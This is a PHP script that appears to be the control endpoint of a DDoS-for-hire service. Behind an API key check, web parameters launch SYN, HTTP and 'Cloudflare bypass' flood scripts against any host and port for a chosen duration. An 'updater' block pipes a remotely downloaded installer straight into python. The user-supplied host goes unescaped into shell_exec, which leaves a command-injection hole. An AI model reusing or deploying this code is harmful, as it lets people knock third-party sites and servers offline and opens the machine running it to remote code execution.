<?php
ignore_user_abort(true);
set_time_limit(0);

// UPDATER
$update = false;
$remote_version = shell_exec('curl https://raw.githubusercontent.com/xIvan0ff/ethereal-installer/main/version.txt');
if (file_exists('version.txt')) {
    $current_version = file_get_contents('version.txt');
    if (empty($remote_version)) {
        echo ("No connection to GitHub, ignoring version check. Current version: $current_version<br>");
    } else
    if (version_compare($remote_version, $current_version) > 0) {
        $update = true;
    } else if (version_compare($remote_version, $current_version) < 0) {
        die("Local version corrupted. Forcing update.<br>");
        $update = true;
    }
} else {
    $update = true;
}

if ($update) {
    shell_exec('wget -qO- https://raw.githubusercontent.com/xIvan0ff/ethereal-installer/main/installer.py | python -');
    echo ("Updated to version $remote_version.<br>");
}

$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
// $action = $_GET['action'];
$debug = isset($_GET['debug']) ? 1 : 0;

$directory = "REPLACEME";
$array = array("syn", "bypass", "bypassv2", "http", "cfbypass", "stop", "update", "stopall");
$ray = array("b387c979321e6360bc9a3a28fe83eb76");


if (!empty($key)) {
} else {
    die('Error: API key is empty!');
}

if (in_array(md5($key), $ray)) {
} else {
    die('Error: Incorrect API key!');
}


if (!empty($time)) {
} else {
    die('Error: time is empty!');
}


if (!empty($host)) {
} else {
    die('Error: Host is empty!');
}

if (!empty($port)) {
} else {
    die('Error: Port is empty!');
}


if (!empty($method)) {
} else {
    die('Error: Method is empty!');
}


if (in_array($method, $array)) {
} else {
    die('Error: The method you requested does not exist!');
}


if ($port > 44405) {
    die('Error: Ports over 44405 do not exist');
}

// if (ctype_digit($time)) {
//     die('Error: Time is not in numeric form!');
// }

// if (ctype_digit($port)) {
//     die('Error: Port is not in numeric form!');
// }

function is_base64($s)
{
    // Check if there are valid base64 characters
    if (!preg_match('/^[a-zA-Z0-9\/\r\n+]*={0,2}$/', $s)) return false;

    // Decode the string in strict mode and check the results
    $decoded = base64_decode($s, true);
    if (false === $decoded) return false;

    // Encode the string again
    if (base64_encode($decoded) != $s) return false;

    return true;
}

// Decode HOST
if (is_base64($host))
    $host = base64_decode($host);

$command = "";

if ($method == "syn") {
    // ------------------------------------------used to be 55000
    $command = "screen -dm perl $directory/syn.pl $host $port 0 $time";
}
if ($method == "bypass") {
    $command = "screen -dm perl $directory/bypass.pl $host $time";
}
if ($method == "bypassv2") {
    $command = "screen -dm perl $directory/bypass2.pl $host $port 0 $time";
}
if ($method == "http" or $method == "cfbypass") {
    if (substr($host, 0, 4) !== "http") {
        if ($port === 443) {
            $host = "https://$host";
        } else {
            $host = "http://$host";
        }
    }
    if ($method == "cfbypass") {
        $command = "screen -dm perl $directory/bypass.pl $host $time";
        $command = "bash install_cf.sh && screen -dm $directory/ddoser run --url=$host:$port -w 1000 -d " . $time . "s -f $directory/https.txt";
    }
    if ($method == "http") {
        $command = "screen -dm perl $directory/http.pl $host $port 50 500 $time";
    }
}
if ($method == "stop") {
    $command = "pkill $host -f";
}

if ($method == "stopall") {
    $command = "pkill screen";
}

$output = shell_exec($command . " 2>&1");
if ($debug)
    die(nl2br("Output:\n$output\nCommand executed:\n$command"));
else {
    if (empty($output)) die('ok');
    else die($output);
}
